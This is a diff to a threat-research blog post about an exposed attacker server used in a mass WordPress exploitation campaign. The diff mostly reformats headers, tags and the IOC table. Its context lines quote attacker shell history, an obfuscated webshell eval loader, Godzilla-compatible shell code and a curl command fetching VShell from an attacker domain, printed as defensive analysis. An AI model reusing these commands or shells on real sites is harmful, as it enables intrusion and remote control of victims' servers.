@@ -7,12 +7,17 @@ ribbon: black
 description: "Open-directories exposes mass exploitation of web-applications globally"
 categories:
   - Threat Research
+content_type: research
 tags:
-  - Threat Research
+  - China
+  - WordPress
+  - C2
+  - Webshell
+  - Exploitation
 toc: true
 ---
 
-# Overview
+## Overview
 
 Found on the [Hunt.io](https://hunt.io/) platform, an exposed Linux working directory provided a detailed record of a mass web-exploitation operation active in June 2026:
 
@@ -21,7 +26,7 @@ Found on the [Hunt.io](https://hunt.io/) platform, an exposed Linux working dire
 
 The collection held target lists IPs and URLs from FOFA, custom vulnerability scanners, exploit scripts, uploaded PHP payloads, shell inventories, post-exploitation tooling, execution logs, archives, and 2,000 lines of root shell history.
 
-Across 18 documented scanner runs, the operator generated 850k+ attempt records against 442k+ deduplicated vulnerability–site pairs. 
+Across 18 documented scanner runs, the operator generated 850k+ attempt records against 442k+ deduplicated vulnerability–site pairs.
 
 Across all surviving evidence, **25,195 unique normalised sites carry confirmed or validated compromise evidence**. To validate whether your website was targeted, compromised or suspected, please see our [Exposure Checker](https://ctrlaltintel.com/research/Exposure)
 
@@ -39,9 +44,9 @@ The strongest activity centred on **WordPress**. *Breeze Cache*, *ThemeREX Addon
 
 The same server also held exploitation tooling for *PrestaShop*, *Joomla*, *MetInfo*, *Craft CMS*, *Magento*, *Nacos*, and other applications.
 
-# From Target Lists to Webshells
+## From Target Lists to Webshells
 
-## Target acquisition
+### Target acquisition
 
 FOFA was the main target source visible in the workspace. The operator stored a FOFA configuration file and repeatedly generated product-specific lists.
 
@@ -70,7 +75,7 @@ comm -23 /tmp/all_domains_raw.txt /tmp/scanned_63k.txt \
   > /root/new_batch_658k.txt
 ```
 
-## Initial Access
+### Initial Access
 
 > The threat actor leveraged known CVEs in web-apps, primarily Wordpress plugins, in order to gain initial access. We will discuss the success of each CVE for exploitation later:
 
@@ -102,7 +107,7 @@ comm -23 /tmp/all_domains_raw.txt /tmp/scanned_63k.txt \
 * CVE-2024-2961 - GNU C Library iconv - Out-of-bounds write
 * CVE-2020-25213 - WP File Manager - Unauthenticated arbitrary file upload
 
-## Exploit development
+### Exploit development
 
 The shell history records a progression from single-target testing to detached, parallel jobs.
 
@@ -170,7 +175,7 @@ sed -i 's|THREADS = 100|THREADS = 150|' \
 
 This iteration reduced false positives and adapted payloads to extension filters or response behaviour observed during live runs.
 
-## Upload and verification
+### Upload and verification
 
 The most common route to execution was an unauthenticated file-handling function that accepted PHP, accepted an alternative executable extension, or could be made to retrieve an attacker-controlled file.
 
@@ -204,11 +209,11 @@ sort -u |
 wc -l
 ```
 
-# Vulnerabilities Exploited
+## Vulnerabilities Exploited
 
 The table below covers the completed campaigns for which a target cohort and outcome evidence survive.
 
-* **Attempts** - Target records processed by the scanner, before site normalisation and deduplication. 
+* **Attempts** - Target records processed by the scanner, before site normalisation and deduplication.
 * **Confirmed** - Strong proof of exploitation, such as marker execution, command output, arithmetic proof, or an authenticated webshell response.
 * **Validated** - Evidence that an upload or exploit succeeded, but without the same level of execution proof as confirmed results.
 * **Suspected only** - The scanner recorded potentially vulnerable behaviour, but executable access or compromise could not be verified.
@@ -236,11 +241,11 @@ The table below covers the completed campaigns for which a target cohort and out
 
 The directory also contains PoCs and partially operationalised code for *WP File Manager*, *WP File Upload*, *WP Time Capsule*, *ACF Extended*, *Multi Uploader for Gravity Forms*, *Everest Forms Pro*, *User Registration Advanced Fields*, *Drag and Drop Multiple File Upload for Contact Form 7*, *Kali Forms*, *Filester*, *File Away*, *Magento*, *Nacos*, *MaxSite CMS*, and *ThinkPHP*.
 
-> Those components are excluded from the campaign-success totals because the retained evidence does not establish or log a confirmed or validated compromise set. 
+> Those components are excluded from the campaign-success totals because the retained evidence does not establish or log a confirmed or validated compromise set.
 
-# The Highest-Volume WordPress Campaigns
+## The Highest-Volume WordPress Campaigns
 
-## Breeze Cache
+### Breeze Cache
 
 Breeze produced the largest confirmed result set.
 
@@ -291,7 +296,7 @@ nohup python3 /root/breeze_mass.py \
   80 > /root/breeze_scan.log 2>&1 &
 ```
 
-Within the surviving target cohort, 17,064 of 27,879 deduplicated sites produced confirmed evidence. 
+Within the surviving target cohort, 17,064 of 27,879 deduplicated sites produced confirmed evidence.
 
 Common filenames included:
 
@@ -302,7 +307,7 @@ BZ_slnm8o.php
 BZ_v739z6.php
 ```
 
-## ThemeREX Addons
+### ThemeREX Addons
 
 ThemeREX exploitation used:
 
@@ -330,9 +335,9 @@ Observed destinations included:
 /wp-content/uploads/
 ```
 
-The reconciled run contains 3,378 confirmed and 36 validated sites. 
+The reconciled run contains 3,378 confirmed and 36 validated sites.
 
-## Simple File List
+### Simple File List
 
 Simple File List used a two-request chain.
 
@@ -383,7 +388,7 @@ A persistent shell was written as:
 /wp-content/uploads/.bd.php
 ```
 
-## BerqWP
+### BerqWP
 
 BerqWP was attacked through:
 
@@ -410,7 +415,7 @@ The most common destination was:
 
 The reconciled run contains 368 confirmed and four validated sites.
 
-## Custom CSS JS & PHP
+### Custom CSS JS & PHP
 
 This campaign used an unauthenticated SQL injection exposed through:
 
@@ -445,7 +450,7 @@ Dedicated post-exploitation logs contain command output from 17 sites. Eight per
 
 The reconciled campaign contains 452 confirmed sites.
 
-## WavePlayer, Ninja Forms, Gravity Forms, and WPBookit
+### WavePlayer, Ninja Forms, Gravity Forms, and WPBookit
 
 WavePlayer used `waveplayer_create_local_copy` to create executable files beneath the plugin’s upload directory. The reconciled evidence contains 261 confirmed sites.
 
@@ -467,7 +472,7 @@ Gravity Forms used a server-side image retrieval function to fetch an attacker-h
 
 WPBookit used an unauthenticated booking-type image upload. Four sites in the surviving target cohort produced confirmed evidence.
 
-## Malicious plugin installation
+### Malicious plugin installation
 
 Two chains installed attacker-hosted ZIP files.
 
@@ -528,9 +533,9 @@ file_put_contents(
 );
 ```
 
-# Webshells and Persistence
+## Webshells and Persistence
 
-## Password-protected PHP panel
+### Password-protected PHP panel
 
 `new_shell.php`, `new_shell_bypass.php`, and `new_shell_short.php` implement a concealed file-management panel.
 
@@ -569,7 +574,7 @@ if (
 }
 ```
 
-## Godzilla-compatible shell
+### Godzilla-compatible shell
 
 `gls.php` and `gls_fixed.php` implement an encrypted session shell compatible with the Godzilla protocol.
 
@@ -598,7 +603,7 @@ if (isset($_POST[$pass])) {
 }
 ```
 
-# Main Webshell - down.php 
+## Main Webshell - down.php
 
 `down.php` is a large obfuscated PHP webshell with multiple capabilities, protected by the password:
 
@@ -616,11 +621,11 @@ $uri = pack("H*", str_rot13($data));
 eval($uri);
 ```
 
-Late in the activity, the operator attempted to place this panel through several vulnerability families and then merged every URL ending in `down.php`. 
+Late in the activity, the operator attempted to place this panel through several vulnerability families and then merged every URL ending in `down.php`.
 
-## down.php - Capabilities
+### down.php - Capabilities
 
-The `down.php` webshell was the most capable and sophisticated we had observed. It appeared to evolve from [open-source Chinese-developed BestShell](https://github.com/Kevil-hui/BestShell/blob/master/best_php_shell.php), which natively supported both Linux and Windows: 
+The `down.php` webshell was the most capable and sophisticated we had observed. It appeared to evolve from [open-source Chinese-developed BestShell](https://github.com/Kevil-hui/BestShell/blob/master/best_php_shell.php), which natively supported both Linux and Windows:
 
 * complete file management, uploads, downloads, archives, permissions, and timestamps
 * arbitrary operating-system commands and PHP execution
@@ -647,11 +652,11 @@ These included the creation of `mysql$` user account with credential `envl`. Add
 <p class="figure-caption">AV/EDR enumeration</p>
 
 
-We could dedicate a whole blog to the analysis of the capabilities of `down.php`, however this is not in the scope. 
+We could dedicate a whole blog to the analysis of the capabilities of `down.php`, however this is not in the scope.
 
-# Installing VShell on the Operator Host
+## Installing VShell on the Operator Host
 
-A very surprising find was the execution of the below VShell command within the threat actors `.bash_history` file. Typically, we see VShell deployed to victim machines for C2, however here the threat actor is enrolling their VPS. 
+A very surprising find was the execution of the below VShell command within the threat actors `.bash_history` file. Typically, we see VShell deployed to victim machines for C2, however here the threat actor is enrolling their VPS.
 
 ```bash
 (curl -fsSL -m180 http://xs.xxooonline.eu.cc:8080/slw||
@@ -671,7 +676,7 @@ Port:       8080
 Protocol:  WebSocket
 ```
 
-# Timeline
+## Timeline
 
 The saved *Simple File List* report dates confirmed exploitation to **June 11, 2026**. Target generation, vulnerability testing, malicious ZIP retrieval, and scanner development continued over the following days.
 
@@ -681,66 +686,49 @@ From **June 15** through **June 20**, the retained logs and command history show
 
 Payload retrieval and scanner activity continued through June 21.
 
-# Attribution
+## Attribution
 
-We assess with **medium-high** confidence that the mass-exploitation activity was conducted by a **Chinese** actor or Chinese-speaking operator. The strongest evidence is fluent Simplified Chinese in campaign-specific scripts and interactive `.bash_history` entries, including *域名去重 (“domain deduplication”)*, *随便找一个Breeze域名 (“find any Breeze domain”)*, *进程状态 (“process status”)*, and *FOFA扫描日志 (“FOFA scan log”)*. 
+We assess with **medium-high** confidence that the mass-exploitation activity was conducted by a **Chinese** actor or Chinese-speaking operator. The strongest evidence is fluent Simplified Chinese in campaign-specific scripts and interactive `.bash_history` entries, including *域名去重 (“domain deduplication”)*, *随便找一个Breeze域名 (“find any Breeze domain”)*, *进程状态 (“process status”)*, and *FOFA扫描日志 (“FOFA scan log”)*.
 
-The operator also built dedicated workflows for deploying *Godzilla (哥斯拉)* webshells and relied extensively on FOFA. The recovered SNOWLIGHT chain delivered VShell, a remote-access tool frequently used by Chinese groups and developed within a Chinese-speaking community. 
+The operator also built dedicated workflows for deploying *Godzilla (哥斯拉)* webshells and relied extensively on FOFA. The recovered SNOWLIGHT chain delivered VShell, a remote-access tool frequently used by Chinese groups and developed within a Chinese-speaking community.
 
-# Indicators of Compromise
+<a id="indicators-of-compromise"></a>
 
-## Network indicators
+## IOCs
 
-| Indicator | Context |
-|---|---|
-| `137.175.93[.]126` | exploitation and payload-hosting infrastructure |
-| `xs.xxooonline.eu[.]cc` | Operator-side VShell C2 |
-| `43.108.17[.]80` | Observed A-record for the operator-side VShell C2 |
+| Indicator | Type | Context | Confidence | Classification |
+|---|---|---|---|---|
+| `137.175.93[.]126` | IPv4 | Network indicators; exploitation and payload-hosting infrastructure | Not stated | reported |
+| `xs.xxooonline.eu[.]cc` | Domain | Network indicators; Operator-side VShell C2 | Not stated | reported |
+| `43.108.17[.]80` | IPv4 | Network indicators; Observed A-record for the operator-side VShell C2 | Not stated | reported |
+| `.bd.php` | Filename | File and path indicators; recurring artefact reported in the campaign | Not stated | reported |
+| `.wp-log.php` | Filename | File and path indicators; recurring artefact reported in the campaign | Not stated | reported |
+| `.sys_log.php` | Filename | File and path indicators; recurring artefact reported in the campaign | Not stated | reported |
+| `sfl_bk.php` | Filename | File and path indicators; recurring artefact reported in the campaign | Not stated | reported |
+| `.auto.php` | Filename | File and path indicators; recurring artefact reported in the campaign | Not stated | reported |
+| `.sd.php` | Filename | File and path indicators; recurring artefact reported in the campaign | Not stated | reported |
+| `.sd_*.php` | Filename | File and path indicators; recurring artefact reported in the campaign | Not stated | reported |
+| `.leo_*.php` | Filename | File and path indicators; recurring artefact reported in the campaign | Not stated | reported |
+| `.brq-*.php` | Filename | File and path indicators; recurring artefact reported in the campaign | Not stated | reported |
+| `.wvp-*.php` | Filename | File and path indicators; recurring artefact reported in the campaign | Not stated | reported |
+| `.cc-*.php` | Filename | File and path indicators; recurring artefact reported in the campaign | Not stated | reported |
+| `.nf-log.php` | Filename | File and path indicators; recurring artefact reported in the campaign | Not stated | reported |
+| `/wp-content/uploads/breeze/gravatars/` | File path | File and path indicators; recurring artefact reported in the campaign | Not stated | reported |
+| `/wp-content/uploads/trx_addons/` | File path | File and path indicators; recurring artefact reported in the campaign | Not stated | reported |
+| `/wp-content/cache/berqwp/` | File path | File and path indicators; recurring artefact reported in the campaign | Not stated | reported |
+| `/wp-content/uploads/simple-file-list/` | File path | File and path indicators; recurring artefact reported in the campaign | Not stated | reported |
+| `/wp-content/uploads/ninja-forms/` | File path | File and path indicators; recurring artefact reported in the campaign | Not stated | reported |
+| `84F7E396A48913851A10CC78C5CC22A25634564ABD0694465236D2F365E2BDEE` | SHA256 | File hashes; file: down.php | Not stated | reported |
+| `E4AD72B1D7A727FFCCF0E2A9DDF7B08C993826C17EB4B9F49C9734FC54B00B2A` | SHA256 | File hashes; file: new_shell.php | Not stated | reported |
+| `58B17EF746D6FCD9F2E5738486D5AF7C4C02B6732176369536B9782D644EC119` | SHA256 | File hashes; file: new_shell_bypass.php | Not stated | reported |
+| `F14285507192FB7643597E4FFAAB006F9A3021E045999C1114E4E37BDA843B18` | SHA256 | File hashes; file: new_shell_short.php | Not stated | reported |
+| `36BE47426E90899C56221F9521DDE0A20BE3AEFE780753C7DBE8EFEE4D59916E` | SHA256 | File hashes; file: loader_shell.php | Not stated | reported |
+| `54953D3EECC8887F39AC0FDA4D33C84BCB6170144DBD1D133470D757595BEAEC` | SHA256 | File hashes; file: gls.php | Not stated | reported |
+| `0B23404491CAFF35FD5A7A3A3D89F66A5FB48F4BAA57B6C450C15230A0D53181` | SHA256 | File hashes; file: gls_fixed.php | Not stated | reported |
+| `7496C08E0BB24A89814AC83F83551D8159802EA91789C2BE8BB8C9E57C6C3264` | SHA256 | File hashes; file: xs.zip | Not stated | reported |
+| `65E8F2315488670526F055169D7D8496C63A39C452ED74CAE2DA1CB0193969B0` | SHA256 | File hashes; file: shell-deploy.zip | Not stated | reported |
 
-## File and path indicators
-
-Recurring filenames include:
-
-```text
-.bd.php
-.wp-log.php
-.sys_log.php
-sfl_bk.php
-.auto.php
-.sd.php
-.sd_*.php
-.leo_*.php
-.brq-*.php
-.wvp-*.php
-.cc-*.php
-.nf-log.php
-```
-
-Recurring directories include:
-
-```text
-/wp-content/uploads/breeze/gravatars/
-/wp-content/uploads/trx_addons/
-/wp-content/cache/berqwp/
-/wp-content/uploads/simple-file-list/
-/wp-content/uploads/ninja-forms/
-```
-
-## File hashes
-
-| File | SHA-256 |
-|---|---|
-| `down.php` | `84F7E396A48913851A10CC78C5CC22A25634564ABD0694465236D2F365E2BDEE` |
-| `new_shell.php` | `E4AD72B1D7A727FFCCF0E2A9DDF7B08C993826C17EB4B9F49C9734FC54B00B2A` |
-| `new_shell_bypass.php` | `58B17EF746D6FCD9F2E5738486D5AF7C4C02B6732176369536B9782D644EC119` |
-| `new_shell_short.php` | `F14285507192FB7643597E4FFAAB006F9A3021E045999C1114E4E37BDA843B18` |
-| `loader_shell.php` | `36BE47426E90899C56221F9521DDE0A20BE3AEFE780753C7DBE8EFEE4D59916E` |
-| `gls.php` | `54953D3EECC8887F39AC0FDA4D33C84BCB6170144DBD1D133470D757595BEAEC` |
-| `gls_fixed.php` | `0B23404491CAFF35FD5A7A3A3D89F66A5FB48F4BAA57B6C450C15230A0D53181` |
-| `xs.zip` | `7496C08E0BB24A89814AC83F83551D8159802EA91789C2BE8BB8C9E57C6C3264` |
-| `shell-deploy.zip` | `65E8F2315488670526F055169D7D8496C63A39C452ED74CAE2DA1CB0193969B0` |
-
-# MITRE ATT&CK
+## MITRE ATT&CK
 
 | Tactic | ID | Technique | Observed use |
 |---|---|---|---|
